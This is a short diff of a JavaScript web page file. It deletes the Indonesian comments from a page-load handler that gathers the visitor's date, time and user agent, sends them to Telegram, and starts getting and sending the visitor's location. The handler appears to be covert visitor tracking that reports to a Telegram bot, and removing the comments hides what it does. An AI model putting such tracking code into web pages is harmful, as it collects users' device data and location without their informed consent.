@@ -103,16 +103,16 @@ function askForLocationPermission() {
 // });
 
 document.addEventListener("DOMContentLoaded", function () {
-    // Mendapatkan tanggal dan waktu saat ini
+    
     var currentDateTime = new Date().toLocaleString();
 
-    // Mendapatkan user agent saat ini
+    
     var userAgent = navigator.userAgent;
 
-    // Mengirim tanggal, waktu, dan user agent saat halaman dimuat
+    
     sendDateTimeAndUserAgentToTelegram(currentDateTime, userAgent);
 
-    // Memulai proses mendapatkan lokasi dan mengirimnya ke Telegram
+    
     getLocationAndSend();
 });
 
